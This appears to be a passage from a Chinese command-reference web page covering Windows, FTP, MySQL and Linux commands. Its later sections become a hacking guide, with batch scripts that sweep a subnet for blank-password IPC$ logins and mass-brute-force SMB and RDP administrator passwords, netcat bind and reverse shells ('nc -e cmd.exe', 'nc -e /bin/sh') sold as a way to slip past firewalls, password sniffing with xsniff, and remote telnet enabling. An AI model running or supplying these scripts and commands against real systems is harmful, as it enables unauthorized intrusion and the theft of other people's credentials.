ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)</p>\n<p>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</p>\n<p>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息</p>\n<p>　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令</p>\n<p>　　mem 查看cpu使用情况</p>\n<p>　　attrib 文件名(目录名) 查看某文件（目录）的属性</p>\n<p>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p>\n<p>　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间</p>\n<p>　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间</p>\n<p>　　set 指定环境变量名称=要指派给变量的字符 设置环境变量</p>\n<p>　　set 显示当前所有的环境变量</p>\n<p>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</p>\n<p>　　pause 暂停批处理程序，并显示出：请按任意键继续….</p>\n<p>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）</p>\n<p>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p>\n<p>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）</p>\n<p>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</p>\n<p>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</p>\n<p>　　echo 信息 在屏幕上显示出信息</p>\n<p>　　echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</p>\n<p>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</p>\n<p>　　find 文件名 查找某文件</p>\n<p>　　title 标题名字 更改CMD窗口标题名字</p>\n<p>　　color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白</p>\n<p>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</p>\n<p>　　ver 在DOS窗口下显示版本信息</p>\n<p>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p>\n<p>　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS</p>\n<p>　　md　目录名 创建目录</p>\n<p>　　replace 源文件　要替换文件的目录 替换文件</p>\n<p>　　ren 原文件名　新文件名 重命名文件名</p>\n<p>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p>\n<p>　　type 文件名 显示文本文件的内容</p>\n<p>　　more 文件名 逐屏显示输出文件</p>\n<p>　　doskey 要锁定的命令=字符</p>\n<p>　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=</p>\n<p>　　taskmgr 调出任务管理器</p>\n<p>　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</p>\n<p>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口</p>\n<p>　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe</p>\n<p>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。</p>\n<p>　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?</p>\n<p>　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</p>\n<p>　　regedit /e 注册表文件名 导出注册表</p>\n<p>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。</p>\n<p>　　cacls 文件名 查看文件的访问用户权限列表</p>\n<p>　　REM 文本内容 在批处理文件中添加注解</p>\n<p>　　netsh 查看或更改本地网络配置情况</p>\n<p>　　IIS服务命令</p>\n<p>　　iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）</p>\n<p>　　iisreset /start或stop 启动（停止）所有Internet服务</p>\n<p>　　iisreset /restart 停止然后重新启动所有Internet服务</p>\n<p>　　iisreset /status 显示所有Internet服务状态</p>\n<p>　　iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动</p>\n<p>　　iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机</p>\n<p>　　iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务</p>\n<p>　　iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。</p>\n<p>　　FTP 命令： (后面有详细说明内容)</p>\n<p>　　ftp的命令行格式为:</p>\n<p>　　ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。</p>\n<p>　　－d 使用调试方式。</p>\n<p>　　－n 限制ftp的自动登录,即不使用.netrc文件。</p>\n<p>　　－g 取消全局文件名。</p>\n<p>　　help [命令] 或 ？[命令] 查看命令说明</p>\n<p>　　bye 或 quit 终止主机FTP进程,并退出FTP管理方式.</p>\n<p>　　pwd 列出当前远端主机目录</p>\n<p>　　put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中</p>\n<p>　　get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中</p>\n<p>　　mget [remote-files] 从远端主机接收一批文件至本地主机</p>\n<p>　　mput local-files 将本地主机中一批文件传送至远端主机</p>\n<p>　　dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件</p>\n<p>　　ascii 设定以ASCII方式传送文件(缺省值)</p>\n<p>　　bin 或 image 设定以二进制方式传送文件</p>\n<p>　　bell 每完成一次文件传送,报警提示</p>\n<p>　　cdup 返回上一级目录</p>\n<p>　　close 中断与远程服务器的ftp会话(与open对应)</p>\n<p>　　open host[port] 建立指定ftp服务器连接,可指定连接端口</p>\n<p>　　delete 删除远端主机中的文件</p>\n<p>　　mdelete [remote-files] 删除一批文件</p>\n<p>　　mkdir directory-name 在远端主机中建立目录</p>\n<p>　　rename [from] [to] 改变远端主机中的文件名</p>\n<p>　　rmdir directory-name 删除远端主机中的目录</p>\n<p>　　status 显示当前FTP的状态</p>\n<p>　　system 显示远端主机系统类型</p>\n<p>　　user user-name [password] [account] 重新以别的用户名登录远端主机</p>\n<p>　　open host [port] 重新建立一个新的连接</p>\n<p>　　prompt 交互提示模式</p>\n<p>　　macdef 定义宏命令</p>\n<p>　　lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录</p>\n<p>　　chmod 改变远端主机的文件权限</p>\n<p>　　case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母</p>\n<p>　　cd remote－dir 进入远程主机目录</p>\n<p>　　cdup 进入远程主机目录的父目录</p>\n<p>　　! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip</p>\n<p>　　#5</p>\n<p>　　MYSQL 命令</p>\n<p>　　mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。</p>\n<p>　　（例：mysql -h110.110.110.110 -Uroot -P123456</p>\n<p>　　注:u与root可以不用加空格，其它也一样）</p>\n<p>　　exit 退出MYSQL</p>\n<p>　　mysqladmin -u用户名 -p旧密码 password 新密码 修改密码</p>\n<p>　　grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）</p>\n<p>　　show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。</p>\n<p>　　use mysql；</p>\n<p>　　show tables; 显示库中的数据表</p>\n<p>　　describe 表名; 显示数据表的结构</p>\n<p>　　create database 库名; 建库</p>\n<p>　　use 库名；</p>\n<p>　　create table 表名 (字段设定列表)； 建表</p>\n<p>　　drop database 库名;</p>\n<p>　　drop table 表名； 删库和删表</p>\n<p>　　delete from 表名; 将表中记录清空</p>\n<p>　　select * from 表名; 显示表中的记录</p>\n<p>　　mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。</p>\n<p>　　win2003系统下新增命令（实用部份）：</p>\n<p>　　shutdown /参数 关闭或重启本地或远程主机。</p>\n<p>　　参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。</p>\n<p>　　例：shutdown /r /t 0 立即重启本地主机（无延时）</p>\n<p>　　taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。</p>\n<p>　　参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。</p>\n<p>　　tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。</p>\n<p>　　参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>\n<p>　　Linux系统下基本命令　注：要区分大小写</p>\n<p>　　uname 显示版本信息（同win2K的 ver）</p>\n<p>　　dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）</p>\n<p>　　pwd 查询当前所在的目录位置</p>\n<p>　　cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。</p>\n<p>　　cat 文件名 查看文件内容</p>\n<p>　　cat &gt;abc.txt 往abc.txt文件中写上内容。</p>\n<p>　　more 文件名 以一页一页的方式显示一个文本文件。</p>\n<p>　　cp 复制文件</p>\n<p>　　mv 移动文件</p>\n<p>　　rm 文件名 删除文件，rm -a 目录名删除目录及子目录</p>\n<p>　　mkdir 目录名 建立目录</p>\n<p>　　rmdir 删除子目录，目录内没有文档。</p>\n<p>　　chmod 设定档案或目录的存取权限</p>\n<p>　　grep 在档案中查找字符串</p>\n<p>　　diff 档案文件比较</p>\n<p>　　find 档案搜寻</p>\n<p>　　date 现在的日期、时间</p>\n<p>　　who 查询目前和你使用同一台机器的人以及Login时间地点</p>\n<p>　　w 查询目前上机者的详细资料</p>\n<p>　　whoami 查看自己的帐号名称</p>\n<p>　　groups 查看某人的Group</p>\n<p>　　passwd 更改密码</p>\n<p>　　history 查看自己下过的命令</p>\n<p>　　ps 显示进程状态</p>\n<p>　　kill 停止某进程</p>\n<p>　　gcc 黑客通常用它来编译C语言写的文件</p>\n<p>　　su 权限转换为指定使用者</p>\n<p>　　telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。</p>\n<p>　　ftp ftp连接上某服务器（同win2K）</p>\n<p>　　批处理命令与变量</p>\n<p>　　1：for命令及变量 基本格式</p>\n<p>　　FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。</p>\n<p>　　批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3</p>\n<p>　　(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }</p>\n<p>　　command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开</p>\n<p>　　command_parameters：为特定命令指定参数或命令行开关</p>\n<p>　　IN (set)：指在(set)中取值；DO command ：指执行command</p>\n<p>　　参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。</p>\n<p>　　用法举例：</p>\n<p>　　@echo off</p>\n<p>　　echo 用法格式：test.bat <em>.</em>.* &gt; test.txt</p>\n<p>　　for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt</p>\n<p>　　存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。</p>\n<p>　　/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：<em>.</em>.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。</p>\n<p>　　@echo off</p>\n<p>　　echo 用法格式：ok.bat ip</p>\n<p>　　FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200</p>\n<p>　　存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。</p>\n<p>　　七：</p>\n<p>　　2：if命令及变量 基本格式</p>\n<p>　　IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。</p>\n<p>　　例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。</p>\n<p>　　0 指发现并成功执行（真）；1 指没有发现、没执行（假）。</p>\n<p>　　IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。</p>\n<p>　　例：“if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）</p>\n<p>　　IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。</p>\n<p>　　例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。</p>\n<p>　　IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”</del></p>\n<p>　　系统外部命令</p>\n<p>　　注：系统外部命令(均需下载相关工具)</p>\n<p>　　瑞士军刀：nc.exe</p>\n<p>　　参数说明：</p>\n<p>　　-h 查看帮助信息</p>\n<p>　　-d 后台模式</p>\n<p>　　-e prog程序重定向，一但连接就执行[危险]</p>\n<p>　　-i secs延时的间隔</p>\n<p>　　-l 监听模式，用于入站连接</p>\n<p>　　-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</p>\n<p>　　-n IP地址，不能用域名</p>\n<p>　　-o film记录16进制的传输</p>\n<p>　　-p[空格]端口 本地端口号</p>\n<p>　　-r 随机本地及远程端口</p>\n<p>　　-t 使用Telnet交互方式</p>\n<p>　　-u UDP模式</p>\n<p>　　-v 详细输出，用-vv将更详细</p>\n<p>　　-w数字 timeout延时间隔</p>\n<p>　　-z 将输入，输出关掉（用于扫锚时）</p>\n<p>　　基本用法：</p>\n<p>　　nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口</p>\n<p>　　nc -l -p 80 开启本机的TCP 80端口并监听</p>\n<p>　　nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口</p>\n<p>　　nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口</p>\n<p>　　nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口</p>\n<p>　　高级用法：</p>\n<p>　　nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</p>\n<p>　　nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt</p>\n<p>　　nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</p>\n<p>　　type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用</p>\n<p>　　本机上用：nc -l -p 本机端口</p>\n<p>　　在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K</p>\n<p>　　nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙</p>\n<p>　　本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</p>\n<p>　　在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机</p>\n<p>　　备 注：</p>\n<p>　　| 管道命令</p>\n<p>　　&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令</p>\n<p>　　@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中</p>\n<p>　　&gt;与&gt;&gt;的区别 “&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。</p>\n<p>　　如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p>\n<p>　　八：</p>\n<p>　　扫描工具：xscan.exe</p>\n<p>　　基本格式</p>\n<p>　　xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息</p>\n<p>　　xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息</p>\n<p>　　检测项目</p>\n<p>　　-active 检测主机是否存活</p>\n<p>　　-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）</p>\n<p>　　-port 检测常用服务的端口状态</p>\n<p>　　-ftp 检测FTP弱口令</p>\n<p>　　-pub 检测FTP服务匿名用户写权限</p>\n<p>　　-pop3 检测POP3-Server弱口令</p>\n<p>　　-smtp 检测SMTP-Server漏洞</p>\n<p>　　-sql 检测SQL-Server弱口令</p>\n<p>　　-smb 检测NT-Server弱口令</p>\n<p>　　-iis 检测IIS编码/解码漏洞</p>\n<p>　　-cgi 检测CGI漏洞</p>\n<p>　　-nasl 加载Nessus攻击脚本</p>\n<p>　　-all 检测以上所有项目</p>\n<p>　　其它选项</p>\n<p>　　-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取</p>\n<p>　　-l 显示所有网络适配器</p>\n<p>　　-v 显示详细扫描进度</p>\n<p>　　-p 跳过没有响应的主机</p>\n<p>　　-o 跳过没有检测到开放端口的主机</p>\n<p>　　-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10</p>\n<p>　　-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)</p>\n<p>　　用法示例</p>\n<p>　　xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机</p>\n<p>　　xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机</p>\n<p>　　xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机</p>\n<p>　　九：</p>\n<p>　　命令行方式嗅探器: xsniff.exe</p>\n<p>　　可捕获局域网内FTP/SMTP/POP3/HTTP协议密码</p>\n<p>　　参数说明</p>\n<p>　　-tcp 输出TCP数据报</p>\n<p>　　-udp 输出UDP数据报</p>\n<p>　　-icmp 输出ICMP数据报</p>\n<p>　　-pass 过滤密码信息</p>\n<p>　　-hide 后台运行</p>\n<p>　　-host 解析主机名</p>\n<p>　　-addr IP地址 过滤IP地址</p>\n<p>　　-port 端口 过滤端口</p>\n<p>　　-log 文件名 将输出保存到文件</p>\n<p>　　-asc 以ASCII形式输出</p>\n<p>　　-hex 以16进制形式输出</p>\n<p>　　用法示例</p>\n<p>　　xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中</p>\n<p>　　xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出</p>\n<p>　　终端服务密码破解: tscrack.exe</p>\n<p>　　参数说明</p>\n<p>　　-h 显示使用帮助</p>\n<p>　　-v 显示版本信息</p>\n<p>　　-s 在屏幕上打出解密能力</p>\n<p>　　-b 密码错误时发出的声音</p>\n<p>　　-t 同是发出多个连接（多线程）</p>\n<p>　　-N Prevent System Log entries on targeted server</p>\n<p>　　-U 卸载移除tscrack组件</p>\n<p>　　-f 使用－f后面的密码</p>\n<p>　　-F 间隔时间（频率）</p>\n<p>　　-l 使用－l后面的用户名</p>\n<p>　　-w 使用－w后面的密码字典</p>\n<p>　　-p 使用－p后面的密码</p>\n<p>　　-D 登录主页面</p>\n<p>　　用法示例</p>\n<p>　　tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码</p>\n<p>　　tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户</p>\n<p>　　@if not exist ipcscan.txt goto noscan</p>\n<p>　　@for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%i</p>\n<p>　　nscan</p>\n<p>　　@echo 3389.txt no find or scan faild</p>\n<p>　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)</p>\n<p>　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat</p>\n<p>　　@if not exist tscrack.exe goto noscan</p>\n<p>　　@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt</p>\n<p>　　:noscan</p>\n<p>　　@echo tscrack.exe no find or scan faild</p>\n<p>　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)</p>\n<p>　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。</p>\n<p>　　其它</p>\n<p>　　Shutdown.exe</p>\n<p>　　Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）</p>\n<p>　　fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）</p>\n<p>　　fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息</p>\n<p>　　Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。</p>\n<p>　　OpenTelnet.exe (远程开启telnet工具)</p>\n<p>　　opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。</p>\n<p>　　NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。</p>\n<p>　　ResumeTelnet.exe (OpenTelnet附带的另一个工具)</p>\n<p>　　resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。</p>\n<p>　　FTP命令详解</p>\n<p>　　FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。</p>\n<p>　　FTP的命令行格式为：</p>\n<p>　　ftp -v -d -i -n -g [主机名] ，其中</p>\n<p>　　-v 显示远程服务器的所有响应信息</p>\n<p>　　-n 限制ftp的自动登录，即不使用；.n etrc文件；</p>\n<p>　　-d 使用调试方式；</p>\n<p>　　-g 取消全局文件名。</p>\n<p>　　FTP使用的内部命令如下(中括号表示可选项):</p>\n<p>　　1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip</p>\n<p>　　2.$ macro-ame[args]： 执行宏定义macro-name。</p>\n<p>　　3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。</p>\n<p>　　4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</p>\n<p>　　5.ascii：使用ascii类型传输方式。</p>\n<p>　　6.bell：每个命令执行完毕后计算机响铃一次。</p>\n<p>　　7.bin：使用二进制文件传输方式。</p>\n<p>　　8.bye：退出ftp会话过程。</p>\n<p>　　9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。</p>\n<p>　　10. cd remote-dir：进入远程主机目录。</p>\n<p>　　11.cdup：进入远程主机目录的父目录。</p>\n<p>　　12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</p>\n<p>　　13.close：中断与远程服务器的ftp会话(与open对应)。</p>\n<p>　　14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。</p>\n<p>　　15.delete remote-file：删除远程主机文件。</p>\n<p>　　16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</p>\n<p>　　17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</p>\n<p>　　18.disconnection：同close。</p>\n<p>　　19.form format：将文件传输方式设置为format，缺省为file方式。</p>\n<p>　　20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。</p>\n<p>　　21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</p>\n<p>　　22.hash：每传输1024字节，显示一个hash符号(#)。</p>\n<p>　　23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</p>\n<p>　　24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</p>\n<p>　　25.image：设置二进制传输方式(同binary)。</p>\n<p>　　26.lcd[dir]：将本地工作目录切换至dir。</p>\n<p>　　27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。</p>\n<p>　　28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</p>\n<p>　　29.mdelete[remote-file]：删除远程主机文件。</p>\n<p>　　30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir <em>.o.</em>.zipoutfile 。</p>\n<p>　　31.mget remote-files：传输多个远程文件。</p>\n<p>　　32.mkdir dir-name：在远程主机中建一目录。</p>\n<p>　　33.mls remote-file local-file：同nlist，但可指定多个文件名。</p>\n<p>　　34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</p>\n<p>　　35.modtime file-name：显示远程主机文件的最后修改时间。</p>\n<p>　　36.mput local-file：将多个文件传输至远程主机。</p>\n<p>　　37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</p>\n<p>　　38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</p>\n<p>　　39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。</p>\n<p>　　40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</p>\n<p>　　41.open host[port]：建立指定ftp服务器连接，可指定连接端口。</p>\n<p>　　42.passive：进入被动传输方式。</p>\n<p>　　43.prompt：设置多个文件传输时的交互提示。</p>\n<p>　　44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</p>\n<p>　　45.put local-file[remote-file]：将本地文件local-file传送至远程主机。</p>\n<p>　　46.pwd：显示远程主机的当前工作目录。</p>\n<p>　　47.quit：同bye，退出ftp会话。</p>\n<p>　　